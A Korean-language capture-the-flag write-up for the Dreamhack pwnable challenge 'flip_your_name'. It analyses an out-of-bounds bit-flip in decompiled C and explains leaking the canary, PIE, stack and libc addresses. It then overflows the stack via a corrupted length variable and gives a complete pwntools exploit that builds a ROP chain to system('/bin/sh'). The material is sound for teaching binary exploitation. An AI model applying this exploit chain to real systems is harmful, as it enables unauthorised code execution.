---
title: "flip_your_name writeup"
date: 2026-06-02 00:00:00 +0900
categories: [Wargame, Dreamhack, Pwnable]
tags: [pwn, rop, stack-bof, bit-flip, dreamhack]
---

## Analysis

### checksec

```
[*] '/home/yoson/youngwon/dreamhack/flip_your_name/flipyourname'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
```

### Source Code

```c
unsigned __int64 sub_11E9()
{
  __int64 v1; // [rsp+8h] [rbp-68h] BYREF
  char s[88]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 v3; // [rsp+68h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  do
  {
    memset(s, 0, 0x51u);
    printf("name? ");
    read(0, s, nbytes);
    printf("flip your name :) ");
    __isoc99_scanf("%ld", &v1);
    s[v1] = ~s[v1];
    printf("hello, %s\n", s);
    printf("want to quit? ");
    __isoc99_scanf("%2s", s);
  }
  while ( s[0] != 121 );
  return v3 - __readfsqword(0x28u);
}

__int64 __fastcall main(int a1, char **a2, char **a3)
{
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 0);
  sub_11E9();
  return 0;
}
```

사용자가 원할 때까지 루프를 돌면서 지역 변수로 선언된 버퍼 `s`에 `nbytes`만큼 입력을 받고, 이후 인덱스를 입력받아 특정 위치의 값을 뒤집는다. 이후 `s`부터 널 바이트를 만날 때까지 출력한 후 반복한다.

## Vulnerability Analysis

셸을 획득하기 위해 먼저 libc base 주소부터 구해야 한다. main의 스택 프레임 ret에는 `__libc_start_call_main+128`의 주소가 저장되어 있다. 따라서 main의 스택 프레임 ret까지의 널 바이트를 모두 뒤집으면 libc base를 구할 수 있다.

이제 실행 흐름을 제어해야 하는데, Full RELRO이므로 이 문제에서는 결국 ROP을 해야 한다. `nbytes`는 `0x50`으로 `.data` 섹션에 선언되어 있다. `s`의 크기는 `0x58`이므로 곧바로 스택 BOF를 시도할 수는 없다. 그러나 `sub_11E9`의 스택 프레임 ret에는 main의 코드 주소가 저장되어 있으므로 이를 leak하면 PIE base도 구할 수 있다. 따라서 `nbytes`의 절대 주소를 구할 수 있다.

또한 `sub_11E9`의 스택 프레임에는 sfp도 저장되어 있다. `s`는 `[rbp - 0x60]`이고 sfp는 rbp와 16바이트 차이가 나므로, sfp를 leak하면 `sfp - 0x76`으로 `s`의 절대 주소도 구할 수 있다. 두 절대 주소를 모두 구했으므로 `s`와 `nbytes` 간의 거리를 계산할 수 있고, 이를 통해 `nbytes`의 값을 뒤집어 스택 BOF 취약점을 트리거할 수 있다. 카나리 역시 leak할 수 있다.

따라서 main의 스택 프레임 ret까지의 널 바이트를 모두 뒤집고 leak하면 이 모든 것을 구할 수 있고, ROP chain을 구성하여 셸을 획득할 수 있다.

널 바이트를 뒤집기 위해 어떤 위치에 널 바이트가 있는지 파악해야 한다. 로컬에서 gdb로 확인한 결과, `s`에 0x50바이트를 `"A"`로 채운 직후 `s`부터 main의 스택 프레임 ret까지의 스택 내용은 다음과 같다.

```
pwndbg> x/100gx $rbp-0x60
0x7fff72f02610: 0x4141414141414141      0x4141414141414141
0x7fff72f02620: 0x4141414141414141      0x4141414141414141
0x7fff72f02630: 0x4141414141414141      0x4141414141414141
0x7fff72f02640: 0x4141414141414141      0x4141414141414141
0x7fff72f02650: 0x4141414141414141      0x4141414141414141
0x7fff72f02660: 0x00007fff72f02700      0x02a3a41c6fc54b00
0x7fff72f02670: 0x00007fff72f02680      0x00005ba3b1168345
0x7fff72f02680: 0x0000000000000001      0x000074f263629d90
...
```

각 위치의 널 바이트 인덱스를 계산하여 순서대로 뒤집어 주면 된다. 이후 한 번에 leak하고 파싱한 뒤, 구한 재료들로 ROP chain을 구성하여 셸을 획득한다.

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./flipyourname")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 20012)

    return r


def main():
    r = conn()

    # flip null bytes
    null_indexes = [
        80, 86, 87,       # 0x7fff72f02660
        88,               # 0x7fff72f02668
        102, 103,         # 0x7fff72f02670
        110, 111,         # 0x7fff72f02678
        113, 114, 115, 116, 117, 118, 119  # 0x7fff72f02680
    ]
    for i in null_indexes:
        r.sendafter(b"name? ", b"A" * 0x50)
        r.sendlineafter(b"flip your name :) ", str(i).encode())
        r.sendlineafter(b"want to quit? ", b"n")

    # leak stack values
    r.sendafter(b"name? ", b"A" * 0x50)
    r.sendlineafter(b"flip your name :) ", b"80")
    r.recvuntil(b"hello, ")
    stack_leak = r.recvline()[:-1]
    r.sendlineafter(b"want to quit? ", b"n")

    # parse leaks
    canary    = u64(b"\x00" + stack_leak[89:96])
    sfp       = u64(stack_leak[96:102] + b"\x00\x00")
    pie_base  = u64(stack_leak[104:110] + b"\x00\x00") - 0x1345
    libc_base = u64(stack_leak[120:126] + b"\x00\x00") - libc.symbols["__libc_start_call_main"] - 128

    # flip lower 1byte of nbytes for BOF
    nbytes       = pie_base + 0x4010
    nbytes_index = nbytes - (sfp - 0x70)
    r.sendafter(b"name? ", b"A" * 0x50)
    r.sendlineafter(b"flip your name :) ", str(nbytes_index).encode())
    r.sendlineafter(b"want to quit? ", b"n")

    # rop chain
    libc.address = libc_base
    system     = libc.symbols["system"]
    binsh      = next(libc.search(b"/bin/sh\x00"))
    rdi_gadget = ROP(libc).find_gadget(["pop rdi", "ret"])[0]
    ret_gadget = ROP(libc).find_gadget(["ret"])[0]

    payload  = b"A" * 0x58
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(ret_gadget)
    payload += p64(rdi_gadget)
    payload += p64(binsh)
    payload += p64(system)

    r.sendafter(b"name? ", payload)
    r.sendlineafter(b"flip your name :) ", b"0")
    r.sendlineafter(b"want to quit? ", b"y")

    r.interactive()


if __name__ == "__main__":
    main()
```